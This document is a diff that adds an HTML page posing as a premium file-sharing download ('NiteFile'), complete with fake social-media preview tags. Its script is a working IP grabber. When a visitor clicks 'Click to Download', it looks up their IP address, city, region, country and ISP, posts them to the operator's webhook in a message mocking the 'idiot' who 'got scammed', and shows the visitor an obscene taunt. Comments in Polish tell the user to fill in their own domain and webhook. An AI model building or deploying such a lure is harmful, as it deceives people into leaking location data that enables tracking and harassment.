@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Reveal</title>
+
+    <meta property="og:title" content="NiteFile - Premium File Sharer Subscription">
+    <meta property="og:description" content="Secure & premium file sharing service. Click to reveal and download your file instantly.">
+    <meta property="og:image" content="https://twojadomena.com/preview.jpg"> <!-- podmień na swój obrazek -->
+    <meta property="og:url" content="https://twojadomena.com">  <!-- podmień na swoja domene -->
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="NiteFile">
+
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="NiteFile - Premium File Sharer Subscription">
+    <meta name="twitter:description" content="Secure & premium file sharing service. Click to reveal and download your file instantly.">
+    <meta name="twitter:image" content="https://twojadomena.com/preview.jpg"> <!-- podmień na swój obrazek -->
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="text-center">
+        <h2 class="my-4">NiteFile - Premium File Sharer Subscription</h2>
+        
+
+
+        <div id="ip-card-2">
+            <i class="bi bi-archive-fill"></i>
+
+            <h3>YourFile.extension</h3>
+            <strong>2.57mb</strong> <br>
+            <strong>x Downloads</strong> <br>
+            <strong>Uploaded: xx.xx.xxxx</strong>
+        </div>
+        <button id="btn" class="my-3">Click to Download</button>
+        
+        <div id="ip-card">
+            <h2 id="ip">0.0.0.0</h2>
+            <div class="geo-info" id="geo">
+                Loading location...
+            </div>
+        </div>
+        <div id="fuck-you" class="fuck-you-text my-3 d-flex align-items-center justify-content-center flex-column">
+            <h2>Get Fucked lil boy 🖕</h2>
+        </div>
+        
+    </div>
+
+    <script>
+        const btn = document.getElementById('btn');
+        const ipCard = document.getElementById('ip-card');
+        const ipText = document.getElementById('ip');
+        const geoInfo = document.getElementById('geo');
+        const ipCard2 = document.getElementById('ip-card-2');
+        const fuck = document.getElementById('fuck-you');
+
+        function typeWriter(element, text, delay = 80) {
+            let i = 0;
+            element.textContent = "";
+            function typing() {
+                if (i < text.length) {
+                    element.textContent += text.charAt(i);
+                    i++;
+                    setTimeout(typing, delay);
+                }
+            }
+            typing();
+        }
+
+        btn.addEventListener('click', () => {
+            btn.style.display = 'none';
+            ipCard.style.display = 'block';
+            ipCard2.style.display = 'none';
+            fuck.style.display = 'block';
+            fuck.style.opacity = '1';
+            
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    typeWriter(ipText, data.ip);
+                    sendEmbed(data.ip, data.city, data.region, data.country_name, data.org);
+                    geoInfo.innerHTML = `
+                        <strong>City:</strong> ${data.city} <br>
+                        <strong>Region:</strong> ${data.region} <br>
+                        <strong>Country:</strong> ${data.country_name} <br>
+                        <strong>ISP:</strong> ${data.org}
+                    `;
+                })
+                .catch(err => {
+                    ipText.textContent = "Error";
+                    geoInfo.textContent = "Could not load location data.";
+                    console.error(err);
+                });
+        });
+        const webhookURL = "YOUR_WEBHOOK_URL"; // <- podmień na swój webhook
+
+        function sendEmbed(ip, city, region, country, isp ) {
+        const embed = {
+            title: "Another bro got scammed 🤣",
+            description: `**IP** of the idiot XDDDDDDDDDDDDDD:\n\`\`\`${ip}\`\`\``,
+            color: 0x00b0f4,
+            footer: {
+            text: "SectionB - Http IP Grabber"
+            },
+            timestamp: new Date(),
+            fields: [
+            {
+                name: "",
+                value: `**Miasto:** \`\`\`${city}\`\`\``,
+                inline: false
+            },
+            {
+                name: "",
+                value: `**Region:** \`\`\`${region}\`\`\``,
+                inline: false
+            },
+            {
+                name: "",
+                value: `**Kraj:** \`\`\`${country}\`\`\``,
+                inline: false
+            },
+            {
+                name: "",
+                value: `**ISP:** \`\`\`${isp}\`\`\``,
+                inline: false
+            }
+            ]
+        };
+
+
+        
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: {
+            "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ embeds: [embed] })
+        })
+            .then(res => {
+            if (res.ok) {
+                console.log("Embed wysłany!");
+            } else {
+                console.error("Błąd wysyłania:", res.status, res.statusText);
+            }
+            })
+            .catch(err => console.error("Błąd:", err));
+        }
+        
+
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
